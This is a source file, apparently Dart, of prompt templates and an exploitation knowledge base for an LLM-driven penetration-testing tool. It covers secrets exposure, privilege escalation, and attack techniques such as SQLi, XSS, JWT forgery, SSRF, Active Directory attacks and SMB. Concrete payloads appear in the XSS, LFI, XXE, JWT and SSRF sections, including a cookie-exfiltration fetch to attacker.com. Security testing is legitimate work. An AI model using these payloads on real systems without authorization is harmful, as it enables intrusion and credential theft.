Evidence to look for: TXT verification records in dns_findings (MS-verify, google-site-verification, Salesforce, Okta, HubSpot, Wrike, Atlassian).
Each identified SaaS platform is a phishing target: credential phishing at the SaaS login portal yields access to that platform and potentially to SSO-connected applications.
Severity: INFORMATIONAL — enumerate as attack surface context.

## RULES:
- CONFIDENCE FLOOR: A finding without observed evidence must be rated LOW confidence. MEDIUM requires that the relevant DNS data was observed. HIGH requires specific enumerated subdomain or dangling CNAME evidence.
- Subdomain pattern findings (high-value subdomain categories) should be MEDIUM confidence — they describe likely attack surface that warrants enumeration, not confirmed findings
- Subdomain takeover findings should be HIGH confidence only if the CNAME target shows signs of being unclaimed
- attackVector: NETWORK for all findings
- Do NOT generate internal network or AD findings here
- Each finding category is a SEPARATE entry

''';

  // ---------------------------------------------------------------------------
  // Phase 14.4 — Secrets and Credential Exposure Analysis
  // ---------------------------------------------------------------------------

  /// Secrets and credential exposure analysis prompt.
  /// Fires on any web port present (internal or external) — same condition as web app prompts.
  /// Covers source control exposure, configuration file disclosure, secret management, cleartext auth.
  static String secretsExposurePrompt(String deviceJson) => '''
You are an expert penetration tester specializing in credential and secret discovery. Analyze the device data below and identify attack surfaces where credential material, API keys, or sensitive configuration data may be exposed without authentication.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### Source Control Metadata Exposure
Attacker objective: recover the application's complete source code history, including all credentials hardcoded in configuration files, API keys, database connection strings, and private key material.
Evidence to look for: web application present (HTTP/HTTPS port); any indicator of in-place deployment of a versioned codebase; error messages revealing directory structure; paths in recon data that suggest a repository root in the web root.
Generate this finding when: a web application is deployed — exposed version control directories in web roots is an extremely common finding.
Severity: CRITICAL — full source code history disclosure reveals everything hardcoded across all commits.

### Application Configuration File Exposure
Attacker objective: retrieve database credentials, API keys, cloud provider credentials, and service account passwords from configuration files accessible at default paths.
Evidence to look for: web application technology fingerprint (identifies which configuration file paths to target); any error message revealing configuration file paths; directory enumeration results showing configuration-related paths; technology-specific default configuration file paths (environment files, database configuration, application settings).
Generate findings for the specific configuration file types appropriate to the identified technology stack:
- PHP applications: database.php, config.php, wp-config.php, .env
- Python/Django: settings.py, local_settings.py, .env
- Ruby/Rails: database.yml, secrets.yml, .env
- Java/Spring: application.properties, application.yml
- Node.js: .env, config.js, config.json
- .NET: web.config, appsettings.json, appsettings.Development.json
- Any application: .env files at web root, backup files (.bak, .old, .orig, ~suffix)
Generate when: the web application technology stack is identifiable from any recon signal.
Severity: CRITICAL if database or cloud credentials are likely; HIGH for API keys and service credentials.

### Backup and Archive File Exposure
Attacker objective: retrieve a backup copy of the application source or database that was left in a web-accessible location.
Evidence to look for: web application present; any file management functionality; development or CI/CD indicators in the environment; date-formatted file patterns in discovered URLs.
Common backup patterns: source.zip, backup.tar.gz, db.sql, *.bak, *.old, config.php.bak, index.php~
Severity: CRITICAL for database dumps; HIGH for source code archives; MEDIUM for individual file backups.

### Cloud Provider Credential Exposure
Attacker objective: retrieve cloud provider credentials (AWS access keys, GCP service account JSON, Azure credentials) from web-accessible paths or via path traversal, then authenticate to the cloud API with the instance's permissions.
Evidence to look for: cloud provider indicators in device data (CNAME records, response headers, SPF records pointing to cloud IP ranges); SSRF-capable parameters present (enables querying internal metadata endpoint).
Common paths: /.aws/credentials, /.gcp/service-account.json, /.azure/, /app/.env with cloud keys
Severity: CRITICAL — cloud credentials may yield account-wide access to all cloud resources.

### Secret Management System Exposure
Attacker objective: access the secret management infrastructure directly, bypassing application-layer access controls.
Evidence to look for: HashiCorp Vault UI port (8200) accessible; Kubernetes API accessible (see container prompt); any secret management system indicators in service data or response headers.
Generate when: Vault port or Kubernetes API port is detected alongside web application infrastructure.
Severity: CRITICAL for unauthenticated access; HIGH for weakly authenticated access.

### Cleartext Credential Transmission
Attacker objective: capture credentials in transit by passively monitoring network traffic or being positioned as a network observer.
Evidence to look for:
- HTTP (not HTTPS) ports with authentication prompts — any Basic Auth challenge over HTTP sends credentials Base64-encoded (not encrypted) in every request
- FTP service present alongside web application — FTP credentials transmitted in cleartext and often reused across services
- Any authentication mechanism over a non-TLS port
Severity: HIGH — cleartext credentials are trivially captured by any network observer.

### Git Repository and Development Artifact Exposure
Attacker objective: access development artifacts left in web-accessible locations that reveal internal paths, credentials, or application logic.
Evidence to look for: common development artifact paths in recon data; error messages revealing absolute server paths; any response containing internal file system paths.
High-value development artifacts: .git/config (reveals remote repository URL with embedded credentials), .svn/entries, .hg/hgrc, composer.json, package.json (reveals dependency versions and internal paths), phpinfo() output
Severity: HIGH for credential-containing artifacts; MEDIUM for path/structure disclosure.

## RULES:
- CONFIDENCE FLOOR: A finding without observed evidence in the provided data must be rated LOW confidence. MEDIUM requires that the technology stack or application type was directly observed. HIGH requires that a specific configuration file path or credential exposure indicator was observed.
- Focus on technology-specific configuration paths — a finding is more actionable when it names the exact file path to check
- Do NOT generate findings for cloud metadata endpoints unless SSRF evidence or cloud hosting indicators are present
- attackVector: NETWORK for all findings in this prompt (web-accessible paths)
- privilegesRequired: NONE (these are unauthenticated access paths)
- Do NOT duplicate SSRF findings from the web core prompt — this prompt covers direct file/path disclosure only

''';

  // ---------------------------------------------------------------------------
  // Phase 14.1 — Privilege Escalation Analysis
  // ---------------------------------------------------------------------------

  /// Privilege escalation surface analysis prompt.
  /// Fires when the device has an identifiable OS or service banners that reveal OS-level information.
  /// Covers both Linux and Windows escalation paths detectable from recon data alone.
  static String privilegeEscalationPrompt(String deviceJson) => '''
You are an expert penetration tester specializing in post-exploitation and privilege escalation. Analyze the device data below and identify privilege escalation attack surfaces that can be identified from reconnaissance data — before any shell access is obtained.

Your goal is to generate findings that will be queued for testing once initial access is achieved. Focus on what the OS version, service configuration, and banner data reveal about likely escalation paths.

## DEVICE DATA:
$deviceJson

## ANALYSIS AREAS:

### Linux Privilege Escalation Surface

**Sudo Misconfiguration**
Attacker objective: run commands as root without knowing the root password by exploiting overly permissive sudo rules.
Evidence to look for: OS identified as Linux; service accounts implied by application type (web servers, databases, cron-driven applications often run as service accounts with misconfigured sudo rules). Service banners that identify the application type reveal the likely service account.
Generate this finding when: any Linux host is identified — sudo misconfiguration is endemic and always warrants testing.
Severity: CRITICAL if a full-privilege rule is likely; HIGH in all other cases.

**SUID/SGID Binary Abuse**
Attacker objective: execute arbitrary code at elevated privilege by calling a binary that has the SUID bit set and can be leveraged to escape its intended purpose.
Evidence to look for: custom application paths in service banners; development tool indicators (compilers, interpreters, version control tools); non-standard service binaries. Non-standard SUID binaries are common on developer workstations, build servers, and legacy systems.
Generate this finding when: Linux host with identifiable application stack — always worth checking.
Severity: HIGH to CRITICAL depending on which binaries are found.

**Writable Cron and Service Paths**
Attacker objective: achieve code execution as root by replacing or modifying a script that a privileged cron job or service executes.
Evidence to look for: any Linux host — cron misconfigurations and world-writable service paths are consistent findings on any unmanaged Linux system.
Generate this finding when: Linux host identified.
Severity: HIGH — arbitrary code execution as root once access to a writable path is obtained.

**Kernel Version and Local Privilege Escalation**
Attacker objective: exploit an unpatched kernel vulnerability to escalate from any user to root.
Evidence to look for: OS version string in device data; service banner that pins to a specific OS release (e.g., an application built for a specific Ubuntu LTS that reveals the kernel series); any version string that implies a specific OS era.
Generate this finding when: Linux OS version or release series is identifiable from any recon signal.
Severity: HIGH when kernel version range is identifiable — specific impact depends on what kernel vulnerability classes apply.

**Credential Material in Accessible Locations**
Attacker objective: recover credentials for other services or for privilege escalation from configuration files accessible with low-privilege shell access.
Evidence to look for: web application service present (configuration files for web apps frequently contain database credentials); database service present (connection strings); any application with known configuration file paths.
Generate this finding when: any service with known configuration file conventions is running.
Severity: HIGH — configuration credentials frequently reuse privileged account passwords or provide database admin access.

**PATH Hijacking**
Attacker objective: replace a binary invoked via relative path by a privileged process with an attacker-controlled binary by placing it earlier in PATH.
Evidence to look for: any custom application or script executing other binaries; development environments; CI/CD systems.
Generate this finding when: development, CI/CD, or scripted application environment is identifiable.
Severity: HIGH.

### Windows Privilege Escalation Surface

**Unquoted Service Paths**
Attacker objective: place a binary at a path prefix that Windows service control manager resolves before the intended service binary, achieving execution as the service account or SYSTEM.
Evidence to look for: Windows OS identified; any application that installs as a Windows service (web servers, databases, security tools, custom applications) — these commonly have unquoted paths with spaces.
Generate this finding when: Windows host with identifiable application services.
Severity: HIGH — service account or SYSTEM execution without explicit privilege.

**Weak Service Binary Permissions**
Attacker objective: replace a service executable that a non-privileged user has write access to, so the next service start executes attacker-controlled code.
Evidence to look for: Windows host with applications installed in non-standard paths (not System32 or Program Files — custom application directories are frequently world-writable).
Severity: HIGH.

**Token Impersonation (Service Account Privilege)**
Attacker objective: escalate from a service account (NetworkService, LocalService, IIS AppPool) to SYSTEM by abusing the impersonation privilege these accounts hold by default.
Evidence to look for: IIS present (port 80/443 with Windows OS), any Windows service account implied by application type — IIS AppPool, SQL Server service, etc.
Generate this finding when: IIS or any Windows application server is detected.
Severity: HIGH — this is a reliable escalation path from any IIS or service account context on Windows.

**AlwaysInstallElevated Policy**
Attacker objective: install a malicious MSI package with SYSTEM privileges by exploiting a policy that allows any user to run installers at elevated privilege.
Evidence to look for: Windows host — this policy is found in enterprise environments and development machines where software installation flexibility was prioritized over security.
Generate this finding when: Windows host identified.
Severity: HIGH.

**Scheduled Task Misconfigurations**
Attacker objective: achieve code execution as the task's configured account (often SYSTEM or admin) by modifying a script that a scheduled task executes from a writable path.
Evidence to look for: Windows host; application types that commonly register scheduled tasks (backup software, monitoring agents, antivirus, custom applications).
Severity: HIGH.

**Stored Credential Exposure**
Attacker objective: recover credentials from Windows Credential Manager, application configuration files, or IIS configuration that provide access to other systems or higher-privilege accounts.
Evidence to look for: IIS or web application present; domain environment implied by AD indicators; any application with credential storage (email clients, browser profiles, database clients).
Severity: HIGH — stored credentials provide lateral movement and privilege escalation paths.

## RULES:
- CONFIDENCE FLOOR: A finding without observed evidence in the provided data must be rated LOW confidence regardless of how likely the vulnerability is. MEDIUM confidence requires that the attack surface (OS type + application class) was directly observed. HIGH confidence requires that both the OS and a specific escalation indicator were identified in the recon data.
- OS identification is the primary gate — if OS cannot be determined at any confidence level, do not generate findings
- attackVector for all privilege escalation findings: LOCAL (these require existing shell access)
- privilegesRequired: LOW (assuming initial access as an unprivileged user)
- Generate Linux findings for Linux targets, Windows findings for Windows targets, and both if OS is ambiguous but the service stack implies one
- Do NOT generate escalation findings for network appliances, IoT devices, or OT/ICS targets — the attack surface is device-specific and covered by separate prompts
- Focus on findings that are reliably testable once shell access is obtained

''';

  /// Comprehensive knowledge base for exploitation techniques.
  /// Included in the main testing prompt to guide the LLM.
  static const String exploitKnowledgeBase = '''
## EXPLOITATION TECHNIQUES BY VULNERABILITY TYPE:

### REMOTE CODE EXECUTION (RCE)
Objective: confirm the ability to execute arbitrary OS-level commands on the target — begin with a harmless, distinctive command (current user identity, hostname, network interfaces) to establish proof of execution before attempting any escalation.
- Command injection via unsanitized input passed to a system shell: test injection separators (;, |, &&, backtick, \$() subshell) — different applications sanitize different separators, so test all of them.
- Memory corruption exploitation: when a service version matches a known memory corruption vulnerability class, validate the offset and control conditions in a matching controlled environment before attempting against the live target.
- Deserialization gadget chain execution: when a service deserializes attacker-controlled input, use the appropriate gadget chain payload format for the identified platform and library set to achieve code execution.
- Vulnerability class matching: search for known exploit code matching the identified software name, version, and platform combination — verify the platform target and intended use before running any downloaded exploit code.
- Verification: execute a harmless command that produces unique, observable output (current user, hostname, a unique process marker) and confirm the output appears in the response or via an out-of-band callback channel.

### SQL INJECTION
Objective: inject SQL syntax into a parameter to manipulate database queries — confirm by extracting the database version string or a known table name, or by observing a measurable and reproducible difference in application behavior.
- Injection technique classes:
  - Error-based: inject a syntax-breaking character (single quote, double quote, comment sequences --//**) and observe whether the response contains a database error message disclosing engine type and version
  - Union-based: append a UNION SELECT clause to a query to extract data alongside the legitimate result — requires matching the column count and compatible data types in the injected query
  - Boolean-based blind: inject a condition that makes the response differ when true vs false (AND 1=1 vs AND 1=2) — confirm by observing a consistent, reproducible behavioral difference between the two conditions
  - Time-based blind: inject a conditional time-delay expression appropriate to the identified database engine — confirm by measuring a statistically significant response time difference
- Injection surfaces: form fields (login, search, contact), URL path and query parameters, HTTP headers (User-Agent, Referer, X-Forwarded-For), JSON and XML body fields in API endpoints
- Automated SQL injection testing: capability objective — test a parameter systematically across all injection technique classes to identify exploitable conditions. Several tools provide this capability. Pass session cookies and CSRF tokens to the tool — without these, the tool operates against a validation error response, not the actual injection point.
- CSRF-AWARE TESTING (CRITICAL for modern web apps):
  1. GET the login/form page first to establish a session and capture the CSRF token from the response (form hidden field or meta tag)
  2. Include the CSRF token in every injection test request — without it, the server returns a token validation error rather than processing the injection input, making all results false negatives
  3. When using an automated injection tool on CSRF-protected forms: pass the session cookie and CSRF token as parameters; configure the tool to extract a fresh token from the GET response before each POST
  4. If every tested payload returns the same "invalid token" or validation error, the CSRF token is not being passed correctly — fix token handling before interpreting results
- Verification: extract the database version string, a list of table or schema names, or a specific row value that could only originate from successful query manipulation

### CROSS-SITE SCRIPTING (XSS)
- Reflected XSS: inject payloads into URL parameters, search fields, form inputs — look for unescaped reflection in response
  Basic probe: <script>alert(1)</script> or <img src=x onerror=alert(1)> — if reflected unescaped, vulnerability is confirmed
  JS context escape: if input lands inside a JS string, use "; alert(1); // or '); alert(1); //
  Attribute context escape: if input lands in an HTML attribute, close the attribute: " onmouseover="alert(1)"
- Stored XSS: inject into fields that are later displayed to other users — profile names, comments, descriptions, filenames
  Higher severity than reflected — triggers for every user who views the stored content
  Test persistence: inject, navigate away, return to the page — if payload fires again, it is stored
- DOM-based XSS: payload never reaches the server — injected via document.location, document.URL, location.hash
  Look for JS that reads from location.* and writes to innerHTML, document.write, or eval()
  Payload in hash: https://target.com/page#<img src=x onerror=alert(1)>
- CSP bypass techniques (when Content-Security-Policy is present):
  Check if 'unsafe-inline' is allowed — if so, standard XSS payloads still work
  JSONP endpoints: if allowed origin hosts a JSONP endpoint, inject via callback parameter
  Angular template injection (if AngularJS detected): {{constructor.constructor('alert(1)')()}}
  Data URIs: if data: scheme allowed, <script src="data:text/javascript,alert(1)"></script>
- Cookie theft: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
  For HttpOnly cookies, XSS can still perform authenticated actions (CSRF-via-XSS)
- Verification: Confirm the payload executes in context — for automated testing, use unique identifiers in payloads and check responses
  Blind XSS (stored, triggers for admin): use out-of-band callback URL to confirm execution
- Framework-specific sinks: React dangerouslySetInnerHTML, Vue v-html, Angular [innerHTML] — all bypass framework escaping
- Headers to check: missing X-XSS-Protection (legacy), missing Content-Security-Policy, missing X-Content-Type-Options

### CORS MISCONFIGURATION
- Test: Send `Origin: https://evil.com` header and inspect the response for `Access-Control-Allow-Origin: https://evil.com` AND `Access-Control-Allow-Credentials: true`
  If both are present: attacker can make cross-origin requests with the victim's credentials — CONFIRMED, HIGH severity
- Test null origin: Send `Origin: null` header — if response echoes `Access-Control-Allow-Origin: null` with credentials: true, exploitable via sandboxed iframe
- Verification: The proof is the response headers themselves — capture the raw HTTP response showing the reflected origin
- Exploitation: A malicious page can use XMLHttpRequest or fetch() to call the target API with the victim's cookies, extract responses, and exfiltrate data
- Note: wildcard (`*`) with credentials is rejected by browsers (spec-violating), but test it anyway as some misconfigured servers emit it

### JWT ATTACKS
- Algorithm confusion (RS256→HS256): If the server uses RS256 (asymmetric), obtain the public key → forge a new JWT signed with the public key as HMAC secret → send with `alg: HS256`
  The server's verify step may use the public key as the HMAC secret if it doesn't check the algorithm — yields arbitrary claims without the private key
- Algorithm "none": Modify the header to `alg: none`, strip the signature, send the unsigned token — some libraries accept it
  Test by: base64-decode header → change alg to "none" → remove signature → send; if accepted = confirmed
- Weak HMAC secret: HS256 secrets can be brute-forced offline using tools that accept JWT format
  Common secrets to try: secret, password, 1234, the application name, the domain name
- `kid` parameter injection: if the `kid` header names a key lookup:
  Path traversal: `kid: ../../dev/null` + sign with empty string → may yield valid signature
  SQL injection: `kid: ' UNION SELECT 'secret'--` → sign with "secret" if the SQL query determines the key
- `jku`/`x5u` injection: modify header to point to attacker-controlled URL hosting a forged JWK set
- `exp` claim manipulation: if signature verification is absent (alg:none attack succeeded), modify exp to far future to prevent token expiry

### BUSINESS LOGIC AND RACE CONDITIONS
- Race conditions require sending concurrent requests — the goal is for two requests that should be mutually exclusive to both succeed
  Use tools that support parallel/concurrent request sending; time the requests to arrive at the server simultaneously
  High-value targets: coupon redemption (use the same code twice), purchase at discounted price after stock check, balance withdrawals exceeding account balance
- Price manipulation: send negative quantities (qty=-1) or zero/negative prices in request bodies
  If the server accepts and processes them, this can result in credits being added or items purchased for free
- Workflow bypass: if a multi-step process is enforced by server state (not just client-side), test accessing later steps directly
  Example: if checkout requires step1→step2→step3, try sending a step3 request after step1 without completing step2
- Privilege escalation via parameter: add `role=admin`, `isAdmin=true`, or `privilege=5` to registration or profile update requests
  Mass assignment is common in frameworks that auto-bind request fields to model objects

### BUFFER OVERFLOW
Objective: confirm a memory corruption vulnerability by demonstrating controlled failure or code execution — never attempt exploitation on live production services without explicit authorization, as uncontrolled crashes cause service disruption and potential data loss.
- Version matching: when a service version is identified, check it against known memory corruption vulnerability classes for that software family and version range. A version-confirmed match against a known-exploitable range is a HIGH confidence finding even before exploitation is attempted.
- Offset discovery: use cyclic pattern generation (any tool that generates a de Bruijn sequence) in a controlled, matching environment to identify the exact byte offset at which attacker-controlled input overwrites a control register — this establishes exploitability without risking the live target.
- Memory protection identification: before exploitation, determine which protections are active (ASLR, NX/DEP, stack canaries, RELRO) — these determine which exploitation technique class applies and which bypass is needed.
- Exploit code selection: search for published proof-of-concept or exploit code matching the exact software name, version, and platform combination. Verify that the code targets the correct operating system and architecture before use.
- Controlled environment validation: validate the full exploit chain in a matching controlled environment (same OS version, same software version, same architecture) before attempting against the live target — memory layout differences between environments frequently cause inconsistent behavior.
- Verification: controlled crash at a predictable address confirms memory corruption and register control; code execution should first be confirmed in the controlled environment before the live target is tested.

### AUTHENTICATION BYPASS
Objective: gain authenticated access by exploiting weak, default, or absent credential validation — or by bypassing authentication logic entirely without needing valid credentials.
- Default credential testing: attempt well-known default credentials appropriate to the identified application type, device family, or platform before attempting any enumeration or brute force.
- Authentication logic bypass: test for conditions where the authentication check itself can be circumvented — parameter manipulation (adding admin=true, role=admin, isAdmin=1 to requests), response manipulation (intercepting and modifying the authentication response body before the client processes it), and direct access to post-authentication endpoints without completing the login flow.
- Credential brute force and spraying:
  Capability objective: test a list of username/password combinations against a login service to identify valid credentials.
  For network protocol services (SSH, FTP, database ports): use a credential testing tool appropriate to the protocol. Start with a targeted list of service-specific and platform-default credentials before attempting broader wordlists.
  For HTTP form credential testing — critical gotchas that cause false results:
  1. HTTP form credential testing tools do NOT handle CSRF tokens automatically. For CSRF-protected forms: fetch the CSRF token with a GET request first, include it in each POST request — without this, the server returns a token validation error and reports every attempt as a false negative.
  2. Failure string matching: configure the failure indicator to match the actual error response text precisely. If the tool reports ALL tested credentials as valid, the failure detection string is misconfigured — the tool is matching the wrong response content.
  3. After any tool reports a successful credential: always replay it manually with a properly formed HTTP request (correct CSRF token, correct session cookie) and confirm the server returns an authenticated response (session cookie set, redirect to a dashboard, not back to the login page).
- Verification: a confirmed authentication bypass produces an authenticated response — a new session cookie with elevated scope, a redirect to a protected page, or visible access to data only available after login.

### LOCAL/REMOTE FILE INCLUSION (LFI/RFI)
- Test paths: ../../etc/passwd, ..\\\\..\\\\windows\\\\system32\\\\config\\\\sam
- PHP wrappers: php://filter/convert.base64-encode/resource=
- RFI: Include remote shell from attacker server
- Verification: Read sensitive file content

### XML EXTERNAL ENTITY (XXE)
- Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- Blind XXE: Out-of-band via HTTP/DNS
- Verification: File contents or OOB callback

### SSRF (Server-Side Request Forgery)
Objective: make the server issue HTTP requests to targets of the attacker's choice — reaching internal services not exposed externally, cloud metadata endpoints, or local filesystem content.
- Cloud metadata escalation (highest priority on cloud-hosted targets): the instance metadata service at 169.254.169.254 (AWS/GCP/Azure), 100.100.100.200 (Alibaba), or fd00:ec2::254 (AWS IPv6) returns temporary IAM credentials. Retrieve these to authenticate to cloud APIs with the instance role's permissions.
- Internal service discovery: probe localhost and internal IPs on common administrative ports — application server admin interfaces, secret stores, database admin consoles, and internal APIs are frequently accessible on localhost without authentication because they were never intended to be internet-facing.
- Protocol handler abuse: test whether the SSRF accepts non-HTTP schemes — `file://` to read local files (SSH keys, configuration files, /etc/passwd), `dict://` to fingerprint service banners on arbitrary ports, `gopher://` to send arbitrary TCP payloads to Redis/Memcached/SMTP.
- DNS rebinding bypass: if SSRF protection appears to be hostname/DNS-based, test whether time-of-check vs time-of-use (TOCTOU) in DNS resolution can be exploited — the validation step resolves to a public IP, but the fetch step resolves to an internal IP if the attacker controls DNS TTL.
- Verification: a successful SSRF returns content from the fetched internal resource — metadata credentials, internal API responses, or file contents. Blind SSRF (no output in response) confirmed via out-of-band DNS or HTTP callback to an attacker-controlled server.

### DESERIALIZATION
Objective: exploit a deserialization endpoint that processes attacker-controlled serialized data by injecting a gadget chain payload that executes code during the deserialization process.
- Platform identification is mandatory first: gadget chain payloads are entirely platform-specific. Identify the platform from response headers, error messages, technology indicators, or service context before selecting any payload.
- Java deserialization: serialized Java objects are identifiable by the magic bytes AC ED 00 05 (base64: rO0AB) in request or response data. If this pattern appears in data the application accepts, a gadget chain payload built from libraries present in the application's classpath may execute code. The available gadget chains depend entirely on which third-party libraries are loaded — identify the library versions from error messages, response headers, or known application stack before attempting.
- PHP deserialization: PHP `unserialize()` on attacker-controlled input is exploitable when the application has class definitions with magic methods (`__wakeup`, `__destruct`, `__toString`) that perform dangerous operations. Gadget chain viability depends on the specific class definitions and installed libraries present in the application.
- .NET deserialization: `BinaryFormatter`, `DataContractSerializer`, `TypeNameHandling` in JSON serializers, and similar .NET mechanisms on attacker-controlled input may be exploitable via gadget chains from common .NET framework libraries.
- Safe test approach: probe the endpoint first with a payload that causes a detectable time delay or triggers an observable error — this confirms the endpoint deserializes the payload without requiring a full RCE attempt. Establish deserialization processing before attempting code execution.
- Verification: a time-delay payload response confirms processing; an error message indicating class loading confirms gadget evaluation; an out-of-band DNS or HTTP callback confirms code execution.

### ACTIVE DIRECTORY ATTACKS
Objective: obtain credential material and escalate to domain-level access by exploiting Kerberos protocol conditions, LDAP misconfigurations, NTLM relay, and ACL abuse paths.
- AS-REP Roasting:
  Condition: accounts with the "Do not require Kerberos preauthentication" flag set (userAccountControl bit 0x400000).
  Technique: request an AS-REP for the target account without providing pre-authentication credentials — the KDC responds with a blob encrypted with the account's password hash, which can be cracked offline without any authentication to the domain.
  Identify targets: query LDAP for accounts with the pre-auth disabled attribute set.
  Crack offline: the AS-REP response is in a format accepted by offline password cracking tools that support Kerberos 5 AS-REP hash types — use wordlists and rule sets targeting enterprise password patterns.
- Kerberoasting:
  Condition: any domain account with a Service Principal Name (SPN) set — typically service accounts for SQL, web, backup, and custom applications.
  Technique: an authenticated domain user requests a TGS service ticket for any SPN; the ticket is encrypted with the service account's password hash and is fully offline-crackable without further domain interaction.
  Identify targets: query LDAP for accounts with a non-empty servicePrincipalName attribute.
  Crack offline: the TGS ticket is in a format accepted by offline password cracking tools that support Kerberos 5 TGS hash types.
- Pass-the-Hash:
  Condition: NTLM hash obtained from credential dumping, NTLM capture, or relay.
  Technique: authenticate to SMB, WinRM, and RDP (restricted admin mode) using the raw NTLM hash directly — the NTLM authentication protocol accepts the hash without requiring the plaintext password.
  Use any pass-the-hash capable tool appropriate to the target protocol; specific tool syntax varies.
- LDAP null bind / unauthenticated enumeration:
  Condition: LDAP port (389 or 636) accessible.
  Technique: attempt an anonymous LDAP bind with no credentials — if the server permits it, enumerate domain objects including usernames, computer names, group memberships, and the default password policy. A successful null bind provides the organizational structure needed to plan targeted attacks.
- DCSync:
  Condition: Domain Admin or an account with "Replicating Directory Changes" AND "Replicating Directory Changes All" permissions on the domain NC.
  Technique: simulate a Domain Controller replication request to extract NTLM hashes for all domain accounts — this produces every password hash in the domain including krbtgt, enabling Golden Ticket creation.
  This is a post-exploitation step following privilege escalation; document the ACL conditions that make it possible during the escalation phase.

### UNAUTHENTICATED SERVICE ACCESS
Objective: confirm unauthenticated access to services that should require authentication, and determine the full scope of data and actions available without credentials.
- Redis (default port 6379): attempt a direct unauthenticated connection — if accepted, query server information, enumerate all keys, and read key values. If write access is present, the full RCE escalation path exists via writing SSH authorized_keys or cron job entries to the filesystem.
- MongoDB (default port 27017): attempt a direct unauthenticated connection — if accepted, list all databases and collections and read document samples to establish the scope of exposed data.
- Elasticsearch / OpenSearch (default port 9200): send unauthenticated HTTP requests to the cluster info endpoint and the index listing endpoint to enumerate all indices and assess data exposure scope.
- Memcached (default port 11211): attempt an unauthenticated connection and request server statistics and slab data — this reveals all cached key names and potentially sensitive cached values including session tokens.
- NFS: query the NFS server for its list of exported filesystem paths — if any exports are accessible without authentication or with permissive host restrictions, mount them and enumerate their contents.
- IPMI (port 623 UDP): test for authentication bypass via cipher suite 0 (a design flaw in IPMI 2.0 that allows unauthenticated retrieval of password hashes for all configured users) — hashes are offline-crackable and IPMI access provides out-of-band hardware control independent of the OS.

### DNS-BASED VULNERABILITIES
Objective: identify memory corruption, information disclosure, and configuration abuse vulnerabilities in DNS server software based on the identified software family and version.
- Version-based vulnerability class matching: DNS server software (resolver daemons, recursive resolvers, authoritative servers) has a history of memory corruption vulnerabilities in DNS response parsing and DHCP handling code. When a DNS server software name and version are identified, check them against known vulnerability classes for that software family and version era — particularly for versions that predate security patch releases for that software line.
- Zone transfer misconfiguration: test whether the DNS server permits full zone transfer (AXFR) requests from unauthorized sources — a successful zone transfer reveals the complete internal hostname-to-IP mapping for all zones served, which is high-value reconnaissance for further attack planning. Any DNS query tool capable of sending AXFR requests can test this.
- DNS recursion abuse: an open recursive resolver that answers queries for arbitrary external domains from any source can be used for DNS amplification attacks and may expose internal resolver cache state to probing.
- Exploit code selection: for identified software and version combinations with known memory corruption classes, search for proof-of-concept code matching that exact version range — verify the code targets the correct platform and protocol handler (DNS vs DHCP vs DHCPv6) before use.
- Verification: zone transfer confirmed by receiving a full record set in the response; memory corruption vulnerabilities confirmed by controlled crash at a known offset or observable memory disclosure in the DNS response payload.

### SMB VULNERABILITIES
Objective: identify exploitable SMB conditions — unauthenticated information exposure, signing bypass enabling relay attacks, and remote code execution via platform-specific vulnerability classes.
- Windows SMB remote code execution class: certain Windows SMB versions contain memory corruption vulnerabilities in the server message handling path. Identify the Windows OS version from banners or recon data and check it against known RCE vulnerability classes for that version range. This class ONLY applies to Windows server operating systems — not routers, NAS devices, or embedded Samba builds.
- Linux Samba shared library injection class: Samba versions prior to the 4.6.4 security patch contain a shared library loading vulnerability exploitable via a writable SMB share. This ONLY applies to full Linux server Samba installations with writable shares. CRITICAL: embedded Samba builds (routers, NAS firmware, IoT devices) do NOT include the loadable module functionality and are NOT exploitable via this class — platform identification is mandatory before attempting this technique.
- SMB signing status: query the server's SMB signing policy to determine whether signing is required, enabled but not required, or disabled. Servers where signing is not required are vulnerable to NTLM relay attacks where a captured authentication attempt can be relayed to another service without cracking the credential.
- Null session / anonymous access: attempt an unauthenticated SMB connection to enumerate accessible shares, user account names, OS version, and domain membership. The scope of information returned varies by OS version and configuration.
- Verification: null session success is confirmed by receiving a share list or user enumeration response; code execution classes require OS version confirmation against the relevant vulnerability class range before exploitation is attempted.

### SSL/TLS VULNERABILITIES
Objective: identify protocol-level weaknesses in TLS/SSL configuration that enable traffic decryption, session hijacking, or memory disclosure.
- Heartbleed (OpenSSL memory disclosure class): affects OpenSSL versions prior to the 1.0.1g security patch. Send a malformed heartbeat request — a vulnerable server returns up to 64KB of process memory that may contain private keys, session tokens, and plaintext credentials. Any TLS analysis tool that includes a Heartbleed probe can confirm this; verify by observing non-null memory content in the response rather than a proper error.
- POODLE (SSLv3 downgrade): if the server accepts SSLv3 connections, a CBC padding oracle attack can decrypt session data by forcing a downgrade from TLS. Check whether SSLv3 is listed among the server's accepted protocol versions.
- BEAST (TLS 1.0 CBC): if TLS 1.0 with CBC cipher suites is the highest supported version, chosen-plaintext attacks on the CBC mode may enable session data decryption in contexts where the attacker can observe traffic.
- DROWN (SSLv2 cross-protocol): if the server or any server sharing its private key accepts SSLv2 connections, an attacker may recover the private key through repeated SSLv2 handshake probes, enabling decryption of TLS sessions.
- Weak cipher suite acceptance: verify whether the server negotiates RC4, DES, 3DES, NULL, or EXPORT-grade cipher suites — each is exploitable via known cryptanalytic techniques given sufficient traffic volume.
- Use any TLS/SSL analysis tool that enumerates supported protocols, cipher suites, and certificate properties. Verify the tool correctly handles TLS version negotiation and is not producing false negatives due to session resumption or SNI requirements.
- Verification: protocol downgrade confirmed by observing a completed handshake at the deprecated version; Heartbleed confirmed by non-repeating memory content in the response payload.

### COMMAND INJECTION
- The objective is to inject operating system commands through application input that is passed unsanitized to a system shell or OS-level function.
- Reflected injection: the output of the command appears in the HTTP response. Confirm by injecting a command whose output is distinctive and checking if that output appears.
- Blind injection: no output is returned. Confirm via time-based techniques (inject a command that causes a delay and measure response time) or out-of-band techniques (inject a command that makes a DNS or HTTP request to an attacker-controlled server).
- Common injection vectors: form fields passed to shell functions, URL parameters used in file operations, filenames in upload features, HTTP headers processed by logging or analytics code.
- Characters to test: semicolon (;), pipe (|), double ampersand (&&), backtick (`cmd`), \$() subshell — test each separator because the application may only sanitize some of them.
- Verification: use a command that produces unique, observable output (e.g., hostname, a time-based delay) to distinguish confirmed injection from coincidental response variation.

### SERVER-SIDE TEMPLATE INJECTION (SSTI)
